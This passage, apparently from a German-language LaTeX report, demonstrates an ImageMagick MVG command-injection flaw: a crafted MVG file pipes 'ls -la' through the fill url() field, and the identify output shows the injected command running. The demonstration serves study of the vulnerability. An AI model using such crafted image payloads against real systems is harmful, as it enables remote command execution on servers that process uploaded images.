\newpage
\subsection{Erstes Beispiel: Ausgabe der Dateien im aktuellen Ordner}\label{subsec:erstes-beispiel:-ausgabe-der-dateien-im-aktuellen-ordner}

Es wird eine MVG Datei erstellt und folgend befüllt.

\vspace{5mm}

\begin{lstlisting}[language=Bash, caption=Beispiel 1 - MVG Datei erstellen,label={lst:lstlisting}]
> vim test1.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://miro.medium.com/max/700/1*MI686k5sDQrISBM6L8pf5A.jpeg"|ls "-la)'
pop graphic-context
\end{lstlisting}
\vspace{5mm}


Besonders wichtig ist hier Zeile vier.
In der url() Methode, wird per Pipe ein zweiter Befehl, nämlich ls -la mitgegeben, welcher die Dateien des aktuellen Verzeichnis auflistet.\\


Per identify wird nun im Namen des aktuell angemeldeten Users folgende Ausgabe erzeugt:

\begin{lstlisting}[language=Bash, caption=Beispiel 1 - MVG Datei identify,label={lst:lstlisting}]
> identify test1.mvg
total 16
drwxr-xr-x 2 root root 4096 Dec 16 08:21 .
drwx------ 8 root root 4096 Dec 16 08:20 ..
-rw-r--r-- 1 root root  144 Dec 16 08:21 test1.mvg
identify: unrecognized color `https://miro.medium.com/max/700/1*MI686k5sDQrISBM6L8pf5A.jpeg"|ls "-la' @ warning/color.c/GetColorCompliance/1046.
identify: no decode delegate for this image format `HTTPS' @ error/constitute.c/ReadImage/535.
test1.mvg MVG 640x480 640x480+0+0 16-bit sRGB 144B 0.000u 0:00.000
identify: non-conforming drawing primitive definition `fill' @ error/draw.c/DrawImage/3169.
\end{lstlisting}
\vspace{5mm}


⇒ Das eigentliche identifizieren des Bildes schlägt zwar fehl, es kann aber gut gesehen werden, dass vorher im Hintergrund der hinterlegte Command ausgeführt wurde.
